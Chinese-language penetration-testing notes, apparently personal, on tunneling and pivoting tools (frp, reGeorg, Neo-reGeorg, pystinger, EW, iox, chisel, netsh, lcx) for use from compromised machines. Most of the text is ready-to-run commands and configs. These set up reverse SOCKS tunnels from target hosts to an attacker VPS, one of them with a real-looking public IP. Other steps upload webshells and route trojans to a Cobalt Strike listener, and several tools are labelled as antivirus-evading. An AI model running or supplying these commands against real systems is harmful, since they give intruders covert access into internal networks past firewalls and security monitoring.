<a name="22VL2"></a>
## <br />
要注意，代理工具的版本问题，例如amd或者arm，直接<br />cat /proc/version看清楚版本再选择
<a name="ll5S2"></a>
## Frp代理隧道(免杀)
Vps执行<br />./frps -c frps.ini <br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611333274992-0336821c-2e63-47e7-b7ee-cb4a64a84b29.png#align=left&display=inline&height=142&originHeight=283&originWidth=1105&size=243522&status=done&style=none&width=552.5)<br />frps.ini配置
[common]> server_addr = 0.0.0.0
> server_port = 7000

> token = www.abc.eee           


目标机(靶机)<br />frpc.exe -c frpc.ini<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611333690636-44d118be-a72d-47a7-ae21-525fd72def6e.png#align=left&display=inline&height=51&originHeight=103&originWidth=699&size=46202&status=done&style=none&width=349.5)
[common]  
> server_addr = 121.4.236.95

> server_port = 7000

> tls_enable = true

> pool_count = 5

> token = www.abc.eee
> 

> [plugin_socks]  

> type = tcp

> remote_port = 4567

> plugin = socks5

> plugin_user = root

> plugin_passwd = 1234,abcd

> use_encryption = true

> use_compression = true      


proxifier的socks连4567端口<br />[https://note.youdao.com/ynoteshare1/index.html?id=be615ffa33279d3481b9b2b5ad6d6f27&type=note](https://note.youdao.com/ynoteshare1/index.html?id=be615ffa33279d3481b9b2b5ad6d6f27&type=note)

frp还有控制台的[https://www.codercto.com/a/82144.html](https://www.codercto.com/a/82144.html)
<a name="AKh7p"></a>
##  Stowaway(免杀
go写的代理隧道<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616293719439-cb377327-5ab0-4df3-a7f3-24ae66160a7e.png#align=left&display=inline&height=500&originHeight=667&originWidth=1117&size=53585&status=done&style=none&width=838)<br />[https://github.com/ph4ntonn/Stowaway](https://github.com/ph4ntonn/Stowaway)
<a name="sGfnQ"></a>
## ssh本地动态转发(需要密码
ssh -qTfnN -D 0.0.0.0:80 root@localhost -p 22<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611333707177-8e8e1f37-6fb7-4f48-845c-f9fd96dd91ae.png#align=left&display=inline&height=292&originHeight=389&originWidth=866&size=226126&status=done&style=none&width=650)<br />10.32.240.212 80 sock5  SSH代理，可通4614端口，当时3389转到4614端口
<a name="b7gHx"></a>
## reGeorgSocksProxy （好用，本地操作就行）不出网
需要python2<br />可以和哥斯拉打配合，实现无文件落地<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616321250392-ed063404-7bb8-4527-be01-d32947f5eb8b.png#align=left&display=inline&height=239&originHeight=478&originWidth=676&size=12374&status=done&style=none&width=338)<br />python reGeorgSocksProxy.py -l 0.0.0.0 -p 4444 -u [http://192.168.201.132/re.ico](http://192.168.201.132/re.ico) -r 1024

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616321192832-85108ac2-6e5f-482d-8e00-781b233f8d36.png#align=left&display=inline&height=333&originHeight=666&originWidth=1637&size=204710&status=done&style=none&width=818.5)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616321352615-b21a5a13-5e43-49b6-b9f7-c1802c90927d.png#align=left&display=inline&height=308&originHeight=308&originWidth=554&size=15521&status=done&style=none&width=554)
<a name="Uhz4i"></a>
## Neo-reGeorg (好用，加密的reGeorg)(免杀)
生成加密后的代理脚本。python3就可以<br />python .\neoreg.py generate -k aufeng123<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616247340637-cee339c6-1ac9-4de0-8b89-dbafb14ef5c5.png#align=left&display=inline&height=350&originHeight=699&originWidth=928&size=37628&status=done&style=none&width=464)

python3 neoreg.py -k aufeng123 -u [http://192.168.201.132/aufeng.jsp](http://192.168.201.132/aufeng.jsp) -k aufeng123 -l 0.0.0.0 -p 65534<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616247737230-5f22e2d8-2211-4c71-a5fa-64e24bcc9c81.png#align=left&display=inline&height=332&originHeight=664&originWidth=1209&size=33715&status=done&style=none&width=604.5)<br />挂上proxifier之后。<br />直接访问内网<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616247871083-9ef9ff7d-2eff-4d24-9263-2d86c7ba85a8.png#align=left&display=inline&height=336&originHeight=671&originWidth=754&size=32123&status=done&style=none&width=377)

<a name="mifRy"></a>
## 毒刺pystinger 不出网
[https://github.com/FunnyWolf/pystinger](https://github.com/FunnyWolf/pystinger)

<a name="VSfvK"></a>
### 上线cs

Kali作vps 192.168.201.129  win7:192.168.201.132<br />目前拿下win7 shell<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619527568799-fe0f392c-1322-4b22-913b-7438c508fe16.png#align=left&display=inline&height=157&originHeight=209&originWidth=429&size=46914&status=done&style=none&width=322)<br />上传对应的Pystinger webshell文件并成功访问<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619527588605-4065be5d-7387-4105-aaa8-1b6e5c1df659.png#align=left&display=inline&height=126&originHeight=168&originWidth=679&size=38985&status=done&style=none&width=509)<br />然后将 stinger_server.exe上传到目标服务器 ，执行如下命令：<br />start stinger_server.exe 0.0.0.0<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619527606433-b74395f4-1271-4d2f-90e7-f96ff0e4d987.png#align=left&display=inline&height=373&originHeight=497&originWidth=619&size=146408&status=done&style=none&width=464)<br />然后将stinger_client上传到vps，执行如下命令<br />./stinger_client -w [http://192.168.201.132/proxy.php](http://192.168.201.132/proxy.php) -l 0.0.0.0 -p 60000<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619527636876-38584db2-700d-4416-a69c-a0b2f4d23d40.png#align=left&display=inline&height=300&originHeight=400&originWidth=711&size=393282&status=done&style=none&width=533)<br />cs设置本地的监听地址和60020端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619527679388-46cc3ac8-c364-4347-85c8-942ddc6f1071.png#align=left&display=inline&height=246&originHeight=328&originWidth=533&size=59253&status=done&style=none&width=400)<br />然后发送exe或者powershell木马上线都可以，成功上线，可以看到我们的vps可以看到有数据交互<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619527708236-c8dc7735-c32f-4504-a0b2-e45ad7d36da2.png#align=left&display=inline&height=311&originHeight=415&originWidth=1010&size=442029&status=done&style=none&width=758)
<a name="8uB0H"></a>
### 代理
root@kali:~# ./stinger_client -w [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) -l 127.0.0.1 -p 60000 

然后本地走sock4代理60020端口
<a name="uoXdx"></a>
## Netsh端口转发
Win10访问win7(192.168.10.153)，win7内网有个win3（10.0.0.2）<br />Win7操作：netsh interface portproxy add v4tov4 listenaddress=192.168.10.153 listenport=8888 connectaddress=10.0.0.2 connectport=3389<br />然后访问win7公网的8888端口即可<br /> <br />Netsh interface portproxy show all （查看侦听和连接的端口）<br /> <br />netsh interface portproxy delete v4tov4 listenaddress=192.168.10.153 listenport=8888（关闭端口）<br /> <br /> <br /> <br /> 
<a name="Eq0Fh"></a>
## EW流量转发(好用，可跨平台)
正向代理 ：<br />靶机 Ew_for_Win.exe -s ssocksd -l 8002   （不是i的大写）是L的小写<br />主机 直接用proxifier工具对靶机的公网和8002的socks5版本进行连接<br /> <br /> <br />反向代理：<br />Vps 执行ew_for_Win.exe -s rcsocks -l 1080 -e 8888              <br />靶机 Ew_for_Win.exe -s rssocks -d vps的ip -e 8888<br />本地proxifier配置vps的ip和1080端，即可实现<br /> <br />在linux下执行文件可能要先赋予这个文件夹超级权限。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611333801874-eb423a3e-211f-4bf0-8e5d-c48fc66c64b4.png#align=left&display=inline&height=62&originHeight=123&originWidth=810&size=36019&status=done&style=none&width=405)<br />执行的时候还有加上./不然会说你command not found<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611333817691-f3bb93b1-9e3b-42a8-811e-523bd883412a.png#align=left&display=inline&height=119&originHeight=238&originWidth=1067&size=179373&status=done&style=none&width=533.5)


![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611585619643-4ef4eb14-6203-4662-935b-8a0e6651cff8.png#align=left&display=inline&height=380&originHeight=506&originWidth=806&size=45101&status=done&style=none&width=605)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611585584665-ec9b2046-90cf-492c-ae34-b923af5a57cd.png#align=left&display=inline&height=367&originHeight=489&originWidth=717&size=78833&status=done&style=none&width=538)

a.在vps运行：ew_for_win.exe -s rcsocks -l 1080 -e 8888

b.在出网机器A运行：ew_for_win.exe -s lcx_tran -l 9999 -f vps_ip -g 8888

c.在目标B运行：ew_for_win.exe -s rssocks -d A_ip -e 9999

<a name="o02mz"></a>
## Iox
正向<br />目标机器上开启Socks5服务:<br />iox.exe proxy -l 1080<br />然后proxifier直接连接就行<br />反向<br />Vps启动<br />root@kali:~# ./iox proxy -l 8888 -l 1080<br /> <br />目标机<br />Iox proxy -r vps的ip:8888<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611333859284-90a844e1-889f-4210-af2f-4b9de6cb5015.png#align=left&display=inline&height=68&originHeight=136&originWidth=1039&size=17490&status=done&style=none&width=519.5)<br />然后proxifier直接连接vps的ip+1080端口<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611333872906-42df056e-0ec6-4c13-8803-c0d22b7713a4.png#align=left&display=inline&height=228&originHeight=456&originWidth=1014&size=104061&status=done&style=none&width=507)<br />流量加密

> vps:
>  ./iox proxy -l *9999 -l 1080 -k 000102
> 
> 跳板机：
>  ./iox proxy -r *172.20.10.3:9999 -k 000102


<a name="UBOUs"></a>
## Chisel(免杀)
[https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)<br /> <br />公网主机上启动 chisel server

./chisel server -p 6666 --reverse <br />shell机执行 chisel client<br />./chisel.exe client 服务器ip:6666 R:socks



<a name="H8YBA"></a>
## lcx
条件:3389防火墙做了限制无法访问，转到53端口。<br />本地端口转发<br />
```
lcx.exe -tran 53 192.168.222.137 3389
```
 
<a name="urPLm"></a>
## nb.exe
端口转发<br />[https://github.com/cw1997/NATBypass](https://github.com/cw1997/NATBypass)

<a name="FCUFF"></a>
## abtpps 不出网
起一种端口转发的作用<br />python [abpttsclient.py](http://abpttsclient.py)‐c webshell/config.txt ‐u “代理网页的URL” ‐f 跳板机IP:跳板机端口/目标机IP:目标机端口 <br /> 
<a name="Z3Cxj"></a>
## 冰蝎子自带隧道

[https://www.cnblogs.com/rebeyond/p/14723316.html](https://www.cnblogs.com/rebeyond/p/14723316.html)


